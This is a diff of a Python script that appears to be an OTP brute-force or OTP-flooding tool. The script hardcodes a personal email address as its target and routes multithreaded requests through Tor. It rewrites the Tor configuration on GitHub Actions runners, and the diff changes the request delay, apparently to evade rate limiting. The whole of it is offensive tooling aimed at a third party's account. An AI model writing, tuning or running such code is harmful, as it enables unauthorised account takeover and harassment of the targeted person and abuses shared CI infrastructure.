@@ -3,11 +3,11 @@ from concurrent.futures import ThreadPoolExecutor
 import warnings
 warnings.filterwarnings('ignore')
 
-# ============ USER INPUT — 已写死 ============
-email = "aashiqsiddiqui278@gmail.com"   # ← 改成你要的邮箱
-threads = 4                     # ← 固定 4
-use_tor = True                  # ← 走 Tor
-# ============================================
+# ============ USER INPUT ============
+email = "aashiqsiddiqui278@gmail.com"
+threads = 4
+use_tor = True
+# ====================================
 
 checked = 0
 found = False
@@ -23,7 +23,6 @@ fail_count = 0
 def start_tor_github_actions():
     global tor_started, tor_process
     try:
-        # 确保 ControlPort 开启 (针对 GitHub Actions 环境)
         torrc_add = "\nControlPort 9051\nCookieAuthentication 0\n"
         with open("/etc/tor/torrc", "a") as f:
             f.write(torrc_add)
@@ -124,12 +123,8 @@ def send_otp(thread_id):
     session = get_session()
     
     try:
-        with request_lock:
-            current = time.time()
-            elapsed = current - last_request_time
-            if elapsed < 0.1:
-                time.sleep(0.1 - elapsed)
-            last_request_time = time.time()
+        # THIS IS THE CHANGE: Strict 5-second delay before every request
+        time.sleep(5)
         
         data = {
             'app_id': '100067',
